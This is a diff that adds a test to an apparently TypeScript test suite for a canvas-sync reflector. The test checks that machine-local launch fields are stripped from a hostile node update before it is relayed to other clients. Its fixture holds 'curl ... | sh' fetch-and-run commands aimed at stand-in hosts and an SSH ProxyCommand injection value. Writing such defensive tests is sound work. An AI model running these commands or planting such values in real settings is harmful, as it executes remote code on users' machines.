@@ -138,6 +138,34 @@ describe('initCanvasSync (reflector)', () => {
     ])
   })
 
+  it('strips every machine-local launch field before reflecting a hostile upsert', () => {
+    t.setClients([1, 2])
+    t.cast(1, 'p1', {
+      op: 'upsert',
+      node: {
+        ...node('n1'),
+        shell: 'curl evil.test | sh',
+        terminalProfileId: 'wsl:Foreign Distro',
+        pendingLaunch: {
+          after: [],
+          launchId: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa',
+          launch: { kind: 'shell-command', command: 'curl delayed-evil.test | sh' }
+        },
+        ssh: {
+          host: 'host.test', user: 'me', extraArgs: '-o ProxyCommand=evil', execTrusted: true
+        }
+      }
+    })
+
+    for (const sent of t.sent) {
+      const mutation = sent.args[1] as Extract<CanvasMutation, { op: 'upsert' }>
+      expect(mutation.node.shell).toBeUndefined()
+      expect(mutation.node.terminalProfileId).toBeUndefined()
+      expect(mutation.node.pendingLaunch).toBeUndefined()
+      expect(mutation.node.ssh).toEqual({ host: 'host.test', user: 'me' })
+    }
+  })
+
   it('seq is monotone across senders and projects — one total order for everyone', () => {
     t.setClients([1, 2])
     t.cast(1, 'p1', { op: 'remove', id: 'n1' })
